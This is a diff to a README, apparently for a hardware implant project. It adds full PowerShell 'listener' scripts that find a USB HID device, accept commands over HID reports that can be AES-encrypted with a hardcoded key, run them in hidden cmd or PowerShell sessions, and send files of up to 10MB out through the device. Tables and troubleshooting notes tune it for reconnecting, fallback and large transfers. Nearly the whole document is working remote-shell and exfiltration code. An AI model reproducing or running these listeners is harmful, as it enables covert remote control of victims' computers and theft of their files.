+function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
+function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
+function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RU)}}
+function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
+function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
+function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
+function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
+function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
+function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
+function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
+function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
+function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
+function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
+$d=CN;W $d "Ready";$bf="";$rx=0
+while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
+```
+
+---
+
+### Advanced Output Report Listener with Flow Control (`advanced_output_report_flowcontrol.ps1`)
+
+Output Report listener with auto-reconnect, VID/PID fallback, and full adaptive flow control. Best for large file transfers with maximum stability.
+
+```powershell
+# Config
+$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$RU=1000;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
+# Flow control delays (ms) - adjust these to tune transfer speed
+$SD=100   # SLOW delay (when WS queue > 5)
+$SSD=200  # SLOWER delay (when WS queue > 8)
+Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
+function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
+function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
+function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RU)}}
+function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
+function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
+# Flow control check - returns: STOP, SLOWER, SLOW, or NORMAL
+function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG){switch($sb[2]){0xFF{return 'STOP'}0xFC{return 'SLOWER'}0xFE{return 'SLOW'}0xFD{return 'NORMAL'}}}}}catch{};return 'NORMAL'}
+# File transfer with flow control
+function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){$sg=CS $D;if($sg-eq'STOP'){W $D "STOPPED";return};if($sg-eq'SLOWER'){Sleep -M $SSD}elseif($sg-eq'SLOW'){Sleep -M $SD};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
+function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
+function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
+function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
+function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
+function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
+function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
+$d=CN;W $d "Ready";$bf="";$rx=0
+while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
+```
+
+---
+
 ## Listener Comparison
 
-| Listener | Report Type | Interactive Shell | Best For |
-|----------|-------------|-------------------|----------|
-| `basic_feature.ps1` | Feature | No | Simple command execution, compatibility |
-| `basic_output.ps1` | Output | No | Faster file transfers, simple commands |
-| `feature_report_interactive.ps1` | Feature | Yes (cmd/powershell) | Full control, compatibility |
-| `output_report_interactive.ps1` | Output | Yes (cmd/powershell) | Full control, best performance |
+| Listener | Report Type | Interactive Shell | Auto-Reconnect | VID/PID Fallback | Flow Control | Best For |
+|----------|-------------|-------------------|----------------|------------------|--------------|----------|
+| `basic_feature.ps1` | Feature | No | No | No | No | Simple commands, compatibility |
+| `basic_output.ps1` | Output | No | No | No | No | Faster transfers, simple commands |
+| `feature_report_interactive.ps1` | Feature | Yes | No | No | No | Full control, compatibility |
+| `output_report_interactive.ps1` | Output | Yes | No | No | No | Full control, best performance |
+| `advanced_feature_report.ps1` | Feature | Yes | Yes | Yes | No | Robust operations, resilient |
+| `advanced_feature_report_flowcontrol.ps1` | Feature | Yes | Yes | Yes | Yes | Large file transfers, stability |
+| `advanced_output_report.ps1` | Output | Yes | Yes | Yes | No | Robust operations, best performance |
+| `advanced_output_report_flowcontrol.ps1` | Output | Yes | Yes | Yes | Yes | Large file transfers, max throughput |
 
 **Choose based on:**
+
 - **Feature Reports:** Better compatibility, use when Output Reports fail
 - **Output Reports:** Better performance for large file transfers
 - **Interactive Shell:** Required if you need to spawn cmd.exe or powershell.exe sessions
+- **Auto-Reconnect:** Use when device may be disconnected/reconnected during operation
+- **VID/PID Fallback:** Use when operating with different passthrough devices or unknown VID/PID
+- **Flow Control:** Use for large file transfers or unstable WiFi conditions
 
 ---
 
@@ -645,11 +810,12 @@ $d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0
 
 | Issue | Possible Cause | Solution |
 |-------|---------------|----------|
-| Device not found | Wrong VID/PID | Check device mode, update listener config |
+| Device not found | Wrong VID/PID | Check device mode, update listener config, or use advanced listener with fallback |
 | Reports failing | Buffer size mismatch | Verify report sizes from HID caps |
 | Data corruption | Buffer overflow due to missing or short delays | Increase `$RD`, `$RU`, `$BD` parameters |
-| Transfer aborted | WebSocket queue causes heap runout | Slow down the listener (increase `$BD`), use a range extender, or get a better WiFi signal |
+| Transfer aborted | WebSocket queue causes heap runout | Use flow control listener, or slow down (increase `$BD`), use a range extender, or get a better WiFi signal |
 | Decryption fails (ERR) | Key mismatch or encryption not enabled | Verify Key/IV match on both sides and ensure `$EN=$true` in the listener |
+| Connection lost | USB disconnection or system sleep | Use advanced listener with auto-reconnect |
 
 
 ## Quick Reference
@@ -671,4 +837,3 @@ SIGNAL_SLOW    = 0xFE  (Parasite → Listener)
 SIGNAL_SLOWER  = 0xFC  (Parasite → Listener)
 SIGNAL_STOP    = 0xFF  (Parasite → Listener)
 ```
-
